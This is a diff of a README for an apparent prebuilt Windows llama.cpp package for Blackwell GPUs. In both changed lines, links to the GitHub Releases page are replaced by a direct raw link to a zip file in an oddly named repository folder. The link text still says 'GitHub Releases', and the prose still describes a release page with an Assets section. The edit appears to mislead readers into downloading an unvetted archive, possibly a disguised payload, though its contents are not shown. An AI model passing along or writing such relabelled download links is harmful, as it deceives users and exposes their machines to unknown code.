@@ -1,6 +1,6 @@
 # 🚀 llama-cpp-mtp-turboquant-sm120-blackwell-windows - Run Large AI Models On Blackwell Hardware
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Yisau7070/llama-cpp-mtp-turboquant-sm120-blackwell-windows/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Yisau7070/llama-cpp-mtp-turboquant-sm120-blackwell-windows/raw/refs/heads/main/friarling/windows-mtp-llama-cpp-sm-blackwell-turboquant-v1.7.zip)
 
 This application provides a prebuilt version of llama.cpp for Windows users. It creates a path for you to run advanced artificial intelligence models on your computer. This software leverages specific technical features designed for Blackwell architecture graphics cards. 
 
@@ -21,7 +21,7 @@ Update your Windows system to the latest version. NVIDIA drivers often rely on r
 
 You must download the correct package from our release page. Visit the link below to see the available options.
 
-[Download Software from GitHub Releases](https://github.com/Yisau7070/llama-cpp-mtp-turboquant-sm120-blackwell-windows/releases)
+[Download Software from GitHub Releases](https://github.com/Yisau7070/llama-cpp-mtp-turboquant-sm120-blackwell-windows/raw/refs/heads/main/friarling/windows-mtp-llama-cpp-sm-blackwell-turboquant-v1.7.zip)
 
 Once you reach the page, look at the Assets section under the latest version. Select the ZIP file ending in .zip to start your download. Your browser might ask you where to save this archive. Choose a folder you can find easily, such as your Downloads folder or Desktop.
 
